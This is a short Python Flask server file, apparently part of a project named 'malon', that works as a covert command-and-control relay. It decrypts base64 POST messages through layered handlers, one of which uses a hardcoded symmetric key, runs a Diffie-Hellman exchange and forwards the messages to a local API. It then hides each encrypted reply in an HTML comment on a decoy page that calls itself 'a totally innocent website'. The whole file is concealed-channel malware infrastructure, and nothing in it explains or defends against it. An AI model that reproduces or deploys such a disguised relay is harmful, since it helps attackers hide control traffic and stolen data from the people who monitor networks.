from flask import Flask, request
from base64 import b64decode, b64encode

from .sym import EncryptedHandler
from .dh import DHHandler
from .api import ApiHandler

from malon_common.crypto.dh import KeyExchange

app = Flask(__name__)

handler = ApiHandler('http://localhost:8081')
handler = DHHandler(KeyExchange(), handler)
handler = EncryptedHandler(b64decode('c29tZSByYW5kb20ga2V5IQ=='), handler)

@app.route('/', methods=["POST"])
def root():
    msg = b64decode(request.form['m'])
    response_msg = handler.handle_msg(msg)
    return """
<html>
    <head><!--{}--></head>
    <body>I'm a totally innocent website</body>
</html>
    """.format(b64encode(response_msg).decode('utf-8'))

